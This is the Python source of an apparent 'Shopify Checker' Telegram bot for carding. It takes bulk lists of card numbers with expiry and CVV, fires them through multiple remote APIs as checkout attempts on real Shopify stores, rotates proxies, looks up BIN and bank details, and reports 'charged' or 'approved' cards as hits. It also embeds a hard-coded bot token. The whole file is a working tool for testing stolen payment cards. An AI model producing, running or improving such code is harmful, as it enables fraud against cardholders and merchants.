import os
import re
import io
import time
import json
import queue
import random
import threading
import requests
import telebot
from telebot import types

# ==================== CONFIG ====================
BOT_TOKEN = "8832919810:AAFeP925STQ41x7ruXc9Ra5-rfApymW3mx0"
ADMIN_ID = 6566026385

API_FILE = "apis.json"
PROXY_FILE = "proxies.json"
SITE_FILE = "sites.json"

bot = telebot.TeleBot(BOT_TOKEN)

try:
    bot_info = bot.get_me()
    CREDIT = f"@{bot_info.username}" if bot_info.username else "@ZYELEO"
except Exception:
    CREDIT = "@ZYELEO"

# ==================== STATE MANAGEMENT ====================
def load_json(file, default=[]):
    if os.path.exists(file):
        try:
            with open(file, 'r') as f: 
                data = json.load(f)
                if data: return data
        except: pass
    return default

def save_json(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

API_BASES = load_json(API_FILE, [
    "https://shpiapi9.onrender.com",
    "https://shpiapi8.onrender.com",
    "https://shpiapi7.onrender.com",
    "https://shpiapi6.onrender.com",
    "https://shpiapi5.onrender.com",
    "https://shpiapi4.onrender.com",
    "https://shpiapi3.onrender.com",
    "https://shpiapi-2.onrender.com",
    "https://shpiapi-1.onrender.com",
    "https://shopify-api-b6yt.onrender.com"
])

PROXIES = load_json(PROXY_FILE, [])
SITES = load_json(SITE_FILE, ["yeezy.com", "skims.com"])

api_idx = 0
proxy_idx = 0
site_idx = 0
user_states = {}
pending_files = {}

def get_next_api():
    global api_idx
    if not API_BASES: return None
    url = API_BASES[api_idx % len(API_BASES)]
    api_idx += 1
    return url.rstrip("/")

def get_next_proxy():
    global proxy_idx
    if not PROXIES: return None
    p = PROXIES[proxy_idx % len(PROXIES)]
    proxy_idx += 1
    return p

def get_next_site():
    global site_idx
    if not SITES: return "yeezy.com"
    site = SITES[site_idx % len(SITES)]
    site_idx += 1
    return site

def parse_combos(text):
    pattern = re.compile(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*[|:,]\s*(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    combos = set()
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        m = pattern.search(line)
        if m: 
            combos.add((m.group(1).lower(), m.group(2)))
        else:
            card_match = re.search(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', line)
            if card_match: 
                combos.add(("RANDOM_SITE", card_match.group(1))) 
    return list(combos)

# ==================== BIN LOOKUP ====================
def get_bin_info(cc):
    try:
        bin_num = cc[:6]
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={"Accept-Version": "3"}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            scheme = data.get("scheme", "UNKNOWN").upper()
            type_ = data.get("type", "UNKNOWN").upper()
            level = data.get("brand", "UNKNOWN").upper()
            bank = data.get("bank", {}).get("name", "UNKNOWN").upper()
            country_name = data.get("country", {}).get("name", "UNKNOWN").upper()
            country_emoji = data.get("country", {}).get("emoji", "🏳️")
            return f"{scheme} - {type_} - {level}", bank, f"{country_name} {country_emoji}"
    except: pass
    return "-", "-", "-"

# ==================== FORMAT GENERATOR ====================
def generate_hit_message(combo, site, res_code, price, gate, proxy="None"):
    bin_info, bank, country = get_bin_info(combo)
    
    if res_code == "ORDER_PAID":
        title = "🔥 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎"
    elif res_code == "INSUFFICIENT_FUNDS":
        title = "💳 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 ✅"
    elif res_code == "3DS_REQUIRED":
        title = "🛡️ 𝟯𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 🔐"
    elif res_code == "APPROVED":
        title = "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
    else:
        title = f"🔥 {res_code}"

    style = random.randint(1, 3)
    
    if style == 1:
        return (
            f"{title}\n\n"
            f"[💎] 𝖢𝖺𝗋𝖽 - `{combo}`\n"
            f"[💎] 𝖦𝖺𝗍𝖾𝗐𝖺𝗒 - {gate}\n"
            f"[💎] 𝖠𝗆𝗈𝗎𝗇𝗍 - {price}$\n"
            f"[💎] 𝖱𝖾𝗌𝗉𝗈𝗇𝗌𝖾 - {res_code}\n"
            f"[💎] 𝖲𝗂𝗍𝖾 - {site}\n"
            f"[💎] 𝖯𝗋𝗈𝗑𝗒 - {proxy}\n\n"
            f"[🔎] 𝖡𝗂𝗇 - {bin_info}\n"
            f"[🔎] 𝖡𝖺𝗇𝗄 - {bank}\n"
            f"[🔎] 𝖢𝗈𝗎𝗇𝗍𝗋𝗒 - {country}\n\n"
            f"👾 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 ➜ {CREDIT} ✅"
        )
    elif style == 2:
        return (
            f"{title}\n"
            "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
            f"💳 `{combo}`\n"
            "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
            f"ᴀᴍᴏᴜɴᴛ ${price} 💸\n"
            f"ɢᴀᴛᴇ {gate}\n"
            f"ꜱɪᴛᴇ {site}\n"
            f"ᴘʀᴏxʏ {proxy}\n"
            f"ʙɪɴ {bin_info}\n"
            f"ʙᴀɴᴋ {bank} 💳\n"
            f"ᴄᴏᴜɴᴛʀʏ {country}\n"
            f"ʀᴇѕᴘᴏɴѕᴇ {res_code}\n"
            "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
            f"ᴄʜᴇᴄᴋᴇʀ {CREDIT} 👤"
        )
    else:
        return (
            f"{title}\n"
            "━━━━━━━━━━━━━━━━━\n"
            f"Card ━ `{combo}`\n"
            f"Gateway ━ {gate}\n"
            f"Response ━ {res_code}\n"
            f"Price ━ ${price}\n"
            f"Site ━ {site}\n"
            f"Proxy ━ {proxy}\n"
            "━━━━━━━━━━━━━━━━━\n"
            f"BIN: {bin_info}\n"
            f"Bank: {bank}\n"
            f"Country: {country}\n\n"
            f"💠 {CREDIT}"
        )

# ==================== MULTI-WORKER ENGINE ====================
def api_worker(api_url, combo_queue, msg, progress_lock, stats, use_proxy):
    while True:
        try:
            site, combo = combo_queue.get_nowait()
        except queue.Empty:
            break
            
        url = f"{api_url}/shopii"
        payload = {"site": site, "cc": combo}
        
        proxy = "None"
        if use_proxy:
            p = get_next_proxy()
            if p:
                proxy = p
                payload["proxy"] = p
        
        try:
            r = requests.post(url, json=payload, timeout=45)
            if r.status_code == 200:
                result = r.json()
                res = result.get("Response", "").upper()
                price = result.get("Price", "0.00")
                gate = result.get("Gateway", "shopify_payments")
            else:
                res = f"HTTP_{r.status_code}"
                price = "0.00"
                gate = "unknown"
        except Exception:
            res = "TIMEOUT"
            price = "0.00"
            gate = "unknown"
            
        with progress_lock:
            stats['checked'] += 1
            # All these responses are considered hits/live
            if res in ("ORDER_PAID", "CHARGED", "INSUFFICIENT_FUNDS", "APPROVED", "3DS_REQUIRED"):
                stats['hits'] += 1
                stats['hits_lines'].append(f"{site} | {combo} | {res} | {price}$ | Proxy: {proxy}\n")
                
                hit_msg = generate_hit_message(combo, site, res, price, gate, proxy)
                try:
                    bot.send_message(msg.chat.id, hit_msg, parse_mode='Markdown')
                except: pass
            else:
                stats['bad'] += 1
                
        combo_queue.task_done()

def process_bulk_thread(msg, combos, use_proxy):
    total = len(combos)
    combo_queue = queue.Queue()
    
    for s, c in combos:
        if s == "RANDOM_SITE": combo_queue.put((get_next_site(), c))
        else: combo_queue.put((s, c))
        
    stats = {'checked': 0, 'hits': 0, 'bad': 0, 'hits_lines': []}
    progress_lock = threading.Lock()
    start_time = time.time()
    
    num_apis = len(API_BASES)
    threads = []
    for i in range(num_apis):
        api_url = API_BASES[i].rstrip("/")
        t = threading.Thread(target=api_worker, args=(api_url, combo_queue, msg, progress_lock, stats, use_proxy))
        t.daemon = True
        t.start()
        threads.append(t)
        
    last_update = time.time()
    while any(t.is_alive() for t in threads):
        time.sleep(1)
        now = time.time()
        if now - last_update > 2.5:
            last_update = now
            with progress_lock:
                checked = stats['checked']
                pct = int((checked / total) * 100) if total > 0 else 0
                bar = "█" * int(pct / 10) + "░" * (10 - int(pct / 10))
                elapsed = int(now - start_time)
                cpm = int(checked / (elapsed / 60)) if elapsed > 0 else 0
                
                mode_str = "🌐 Proxy" if use_proxy else "🚀 Direct"
                text = (
                    f"💳 **Live Feed** ({mode_str})\n"
                    "━━━━━━━━━━━━━━━━━\n"
                    f"📊 Progress: `[{bar}]` {pct}%\n"
                    f"✅ Hits: **{stats['hits']:,}** | ❌ Bad: **{stats['bad']:,}**\n"
                    f"⚡ Speed: {cpm:,} CPM | ⏱️ {elapsed}s\n"
                    f"📦 Checked: `{checked:,}/{total:,}`\n"
                    "━━━━━━━━━━━━━━━━━\n"
                    f"👷 Workers: {num_apis} APIs Active\n"
                    f"💠 {CREDIT}"
                )
                try: bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
                except: pass
                
    summary = (
        f"✅ **Done!**\n\n"
        f"Total: `{total:,}`\n"
        f"Hits: `{stats['hits']:,}`\n"
        f"Bad: `{stats['bad']:,}`\n\n"
        f"💠 {CREDIT}"
    )
    bot.edit_message_text(summary, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')

    if stats['hits'] > 0:
        bot.send_document(msg.chat.id, (f"hits_{int(time.time())}.txt", "".join(stats['hits_lines']).encode()), caption=f"🔥 **{stats['hits']:,} Hits**\n💠 {CREDIT}", parse_mode='Markdown')

# ==================== UI KEYBOARDS ====================
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⚙️ APIs", callback_data="menu_api"),
        types.InlineKeyboardButton("🌐 Proxies", callback_data="menu_proxy"),
        types.InlineKeyboardButton("🏪 Sites", callback_data="menu_site"),
        types.InlineKeyboardButton("📊 Stats", callback_data="menu_stats")
    )
    markup.add(types.InlineKeyboardButton("🛠 How to Use", callback_data="menu_help"))
    return markup

def proxy_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📤 Upload TXT", callback_data="proxy_upload"),
        types.InlineKeyboardButton("🧹 Clear All", callback_data="proxy_clear")
    )
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return markup

def site_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ Add Site", callback_data="site_add"),
        types.InlineKeyboardButton("📜 List Sites", callback_data="site_list"),
        types.InlineKeyboardButton("🧹 Clear All", callback_data="site_clear"),
        types.InlineKeyboardButton("🔙 Back", callback_data="menu_main")
    )
    return markup

def api_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ Add API", callback_data="api_add"),
        types.InlineKeyboardButton("📜 List APIs", callback_data="api_list")
    )
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return markup

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def start(message):
    text = (
        "🛍️ **Shopify Checker Bot**\n\n"
        "**Commands:**\n"
        "• `/chk cc|mm|yy|cvv` → Auto-pick a random saved site\n"
        "• `/chk site.com | cc|mm|yy|cvv` → Target a specific site\n"
        "• Reply to `.txt` with `/chk` → Bulk check\n\n"
        "⚙️ *Manage APIs, Proxies, and Sites below.*"
    )
    bot.reply_to(message, text, reply_markup=main_menu(), parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global SITES, API_BASES, PROXIES
    
    data = call.data
    if call.from_user.id != ADMIN_ID and "menu" not in data and not data.startswith("start_"):
        bot.answer_callback_query(call.id, "❌ Admin Only!")
        return

    if data == "menu_main":
        bot.edit_message_text("⚙️ **Main Dashboard**", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
    elif data == "menu_site":
        bot.edit_message_text(f"🏪 **Site Manager**\nSaved Sites: `{len(SITES)}`", call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_add":
        user_states[call.from_user.id] = "awaiting_site"
        bot.edit_message_text("➕ **Send site URL**", call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Cancel", callback_data="menu_site")))
    elif data == "site_list":
        text = "📜 **Saved Sites:**\n\n" + "\n".join([f"{i+1}. `{s}`" for i, s in enumerate(SITES)]) if SITES else "❌ No sites saved."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_clear":
        SITES = []
        save_json(SITE_FILE, SITES)
        bot.answer_callback_query(call.id, "✅ Sites Cleared!")
        bot.edit_message_text(f"🏪 **Site Manager**\nSaved Sites: `0`", call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
        
    elif data == "menu_proxy":
        bot.edit_message_text(f"🌐 **Proxy Manager**\nSaved Proxies: `{len(PROXIES)}`", call.message.chat.id, call.message.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
    elif data == "proxy_upload":
        user_states[call.from_user.id] = "awaiting_proxy_file"
        bot.edit_message_text("📤 **Send `.txt` file**", call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Cancel", callback_data="menu_proxy")))
    elif data == "proxy_clear":
        PROXIES = []
        save_json(PROXY_FILE, PROXIES)
        bot.answer_callback_query(call.id, "✅ Proxies Cleared!")
        bot.edit_message_text(f"🌐 **Proxy Manager**\nSaved Proxies: `0`", call.message.chat.id, call.message.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
        
    elif data == "menu_api":
        bot.edit_message_text(f"⚙️ **API Manager**\nActive APIs: `{len(API_BASES)}`", call.message.chat.id, call.message.message_id, reply_markup=api_menu(), parse_mode='Markdown')
    elif data == "api_add":
        user_states[call.from_user.id] = "awaiting_api"
        bot.edit_message_text("➕ **Send API URL**", call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Cancel", callback_data="menu_api")))
    elif data == "api_list":
        text = "📜 **Saved APIs:**\n\n" + "\n".join([f"{i+1}. `{a}`" for i, a in enumerate(API_BASES)]) if API_BASES else "❌ No APIs saved."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=api_menu(), parse_mode='Markdown')
        
    elif data == "menu_stats":
        bot.edit_message_text(f"📊 **Stats**\n\n⚙️ APIs: `{len(API_BASES)}`\n🌐 Proxies: `{len(PROXIES)}`\n🏪 Sites: `{len(SITES)}`", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
        
    elif data.startswith("start_np_") or data.startswith("start_p_"):
        is_proxy = data.startswith("start_p_")
        msg_id = int(data.replace("start_np_", "").replace("start_p_", ""))
        
        file_id = pending_files.get(msg_id)
        if not file_id:
            bot.answer_callback_query(call.id, "❌ Session expired. Please send the file again.")
            return
            
        mode = "With Proxy" if is_proxy else "No Proxy"
        bot.answer_callback_query(call.id, f"🚀 Starting {mode}...")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        
        t = threading.Thread(target=start_bulk_by_id, args=(call.message, file_id, is_proxy))
        t.start()

# ==================== FILE HANDLER ====================
def process_bulk_file(doc_message, reply_msg=None):
    doc = doc_message.document
    if doc.file_size > 20 * 1024 * 1024:
        bot.reply_to(reply_msg or doc_message, "❌ File too large (Max 20MB).")
        return
        
    pending_files[doc_message.message_id] = doc.file_id
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start No Proxy", callback_data=f"start_np_{doc_message.message_id}"),
        types.InlineKeyboardButton("🌐 Start With Proxy", callback_data=f"start_p_{doc_message.message_id}")
    )
    bot.reply_to(reply_msg or doc_message, f"📁 **File Detected!**\n\nChoose how you want to check the combos:", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if message.caption and message.caption.startswith('/chk'):
        process_bulk_file(message)
        return

    uid = message.from_user.id
    if user_states.get(uid) in ("awaiting_site_file", "awaiting_site"):
        user_states[uid] = None
        msg = bot.reply_to(message, "⏳ Parsing sites...")
        try:
            file_info = bot.get_file(message.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            lines = [line.strip().lower() for line in content.splitlines() if line.strip()]
            added = 0
            for s in lines:
                if s not in SITES:
                    SITES.append(s)
                    added += 1
            save_json(SITE_FILE, SITES)
            bot.edit_message_text(f"✅ Added `{added}` sites.\nTotal: `{len(SITES)}`", msg.chat.id, msg.message_id, reply_markup=site_menu(), parse_mode='Markdown')
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", msg.chat.id, msg.message_id)
        return

    if user_states.get(uid) == "awaiting_proxy_file":
        user_states[uid] = None
        msg = bot.reply_to(message, "⏳ Parsing proxies...")
        try:
            file_info = bot.get_file(message.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            lines = [line.strip() for line in content.splitlines() if line.strip()]
            added = 0
            for p in lines:
                if p not in PROXIES:
                    PROXIES.append(p)
                    added += 1
            save_json(PROXY_FILE, PROXIES)
            bot.edit_message_text(f"✅ Added `{added}` proxies.\nTotal: `{len(PROXIES)}`", msg.chat.id, msg.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", msg.chat.id, msg.message_id)
        return

@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == "awaiting_site")
def handle_site_input(message):
    user_states[message.from_user.id] = None
    url = message.text.strip().lower()
    if url not in SITES:
        SITES.append(url)
        save_json(SITE_FILE, SITES)
        bot.reply_to(message, f"✅ Added `{url}`.", reply_markup=site_menu(), parse_mode='Markdown')

@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == "awaiting_api")
def handle_api_input(message):
    user_states[message.from_user.id] = None
    url = message.text.strip()
    if not url.startswith("http"): url = "https://" + url
    if url not in API_BASES:
        API_BASES.append(url)
        save_json(API_FILE, API_BASES)
        bot.reply_to(message, f"✅ API Added!", reply_markup=api_menu(), parse_mode='Markdown')

# ==================== CHECK COMMANDS ====================
@bot.message_handler(commands=['chk'])
def handle_chk(message):
    if not API_BASES:
        bot.reply_to(message, "❌ No APIs configured.")
        return

    if message.reply_to_message and message.reply_to_message.document:
        process_bulk_file(message.reply_to_message, reply_msg=message)
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2: return
    combos = parse_combos(parts[1])
    if not combos: return
        
    site, combo = combos[0]
    if site == "RANDOM_SITE": site = get_next_site()
        
    msg = bot.reply_to(message, f"🔍 Checking `{site}`...", parse_mode='Markdown')
    
    api = API_BASES[0].rstrip("/")
    url = f"{api}/shopii"
    try:
        r = requests.post(url, json={"site": site, "cc": combo}, timeout=45)
        result = r.json() if r.status_code == 200 else {"Response": f"HTTP_{r.status_code}"}
    except:
        result = {"Response": "TIMEOUT"}
        
    res = result.get("Response", "ERROR").upper()
    price = result.get("Price", "0.00")
    gate = result.get("Gateway", "shopify_payments")
    
    if res in ("ORDER_PAID", "CHARGED", "INSUFFICIENT_FUNDS", "APPROVED", "3DS_REQUIRED"):
        hit_msg = generate_hit_message(combo, site, res, price, gate, proxy="None")
        bot.edit_message_text(hit_msg, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
    else:
        emoji = "❌"
        text = f"{emoji} **Declined**\n💳 `{combo}`\n📝 {res}\n\n💠 {CREDIT}"
        bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')

def start_bulk_by_id(msg, file_id, use_proxy):
    try:
        file_info = bot.get_file(file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        combos = parse_combos(content)
        
        if not combos:
            bot.edit_message_text("❌ No valid combos found.", chat_id=msg.chat.id, message_id=msg.message_id)
            return
            
        mode_str = "With Proxy" if use_proxy else "No Proxy"
        bot.edit_message_text(f"🚀 Checking **{len(combos):,}** combos using **{len(API_BASES)}** API workers ({mode_str})...", chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
        
        process_bulk_thread(msg, combos, use_proxy)
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {e}", chat_id=msg.chat.id, message_id=msg.message_id)

if __name__ == "__main__":
    print("Starting Bot...")
    bot.infinity_polling()
